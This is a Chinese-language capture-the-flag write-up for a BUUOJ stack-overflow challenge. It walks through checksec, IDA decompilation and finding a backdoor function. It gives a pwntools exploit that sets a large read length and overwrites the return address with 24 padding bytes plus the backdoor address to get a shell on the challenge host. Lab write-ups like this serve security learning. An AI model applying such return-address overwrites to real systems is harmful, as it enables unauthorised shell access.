# 题目

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744620167891-15eea2d5-7f77-427f-84a3-162e8205c005.png)

# 做法

开虚拟机checksec

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744620126777-1d4ded16-1fd5-4a19-9914-cfd8e155b54c.png)

64位，没开栈保护

扔进IDA（64位），找到main，F5反编译

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744620251066-7defbbc3-a544-4388-836f-0d516503c036.png)

没啥东西，点进buf看看（同时注意第8行的nbytes，下面要用到）

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744620288539-749e1044-2a02-48f0-a241-fae13f59c9cf.png)

栈溢出吗？不管了，先数为敬，offset=16-4+8（dq=8）+8-4=24

（注：buf读入的数据长度由我们输入的nbytes来控制，所以这里可以利用它来溢出，

原本的大小为0，没得读，只有我们为其赋值，我们写入的东西才能让他读（第8行和第18行代码））

然后找找后门函数

Shift+F12，看看有啥东西可用

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744620474606-f4630d77-a449-46dd-b268-e9a353b228ff.png)

一个system，一个/bin/sh

system点进去没东西

/bin/sh点进去，发现后门函数

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744620462935-7ca975f0-3da8-4183-9077-b74a6e4c4874.png)

exp

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744628620778-85331f88-973c-4b41-9150-a67a3d0a010d.png)

代码如下

```
#导入pwntools模块：
from pwn import *

#和靶机进行连接：
r = remote("node5.buuoj.cn",29658)

#给nbytes赋值（给值相对大点，太小不行，至少给offset和其原本就有的数据预留点位置）
r.sendline('50')

#定义 payload
payload = b'a' * 24 + p64(0x4006E6)

#发送payload
r.sendline(payload)

#获取靶机交互式终端：
r.interactive()
```

常规，得出flag

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744628576835-f7754c2f-c2e8-44bf-908c-dda1761a3660.png)

![](https://cdn.nlark.com/yuque/0/2025/png/53467226/1744628585644-681c0551-f384-42f9-b0de-f151dd14e686.png)

# 更新

于2025.4.14